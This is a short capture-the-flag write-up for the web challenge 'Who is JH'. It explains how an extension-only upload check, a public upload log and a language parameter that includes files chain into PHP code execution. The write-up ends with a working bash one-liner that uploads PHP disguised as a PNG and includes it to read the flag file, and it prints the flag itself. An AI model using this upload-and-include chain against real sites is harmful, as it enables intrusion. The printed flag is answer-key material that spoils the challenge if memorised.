# Who is JH 


Attachment: [challenge.zip](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

## Writeup

In the Dockerfile, I can see where the flag is:  



I can also see that some PHP functions are disabled to prevent RCE:  



In the source code, I can see that there is a publicly accessible log file that I can reference:  



Indeed, when I access it, I can see the name of the file that I uploaded:  



This is helpful because it is using `uniqid` to generate a unique name, but the file upload otherwise is not very restricted. The extension is checked, but the content isn't:  



Continuing the code analysis, I can see that the conspiracy endpoint allows the user to include a file based on the language parameter:  



Putting all of these together, it means we have a valid attack chain to upload a `file.png` with PHP code, use the log to figure out the random name it was given and then use the conspiracy endpoint to include it and run our code.



I can get the flag with this oneliner:  

```bash
echo '<?php echo file_get_contents("/flag.txt")?>' | curl -s -X POST -F "image=@-;filename=test.png" http://challenge.ctf.games:31952/upload.php 1>/dev/null; file=$(curl -s 'http://challenge.ctf.games:31952/logs/site_log.txt'|tail -n 1|awk '{print $5}');curl -s "http://challenge.ctf.games:31952/conspiracy.php?language=uploads/$file"|grep flag
```

flag{6558608db040d1c64358ad536a8e06c6}
